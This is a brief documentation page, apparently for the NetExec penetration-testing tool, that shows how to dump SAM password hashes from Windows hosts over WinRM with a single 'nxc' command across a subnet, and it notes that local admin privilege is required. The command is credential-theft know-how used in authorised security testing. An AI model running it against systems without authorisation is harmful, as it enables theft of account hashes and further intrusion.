# Dump SAM

### Dump SAM hashes
Extracts and downloads SAM registry hive, and uses secretsdump.py methods locally to dump hashes

{% hint style="warning" %}
You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
{% endhint %}

```bash
nxc winrm 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
```

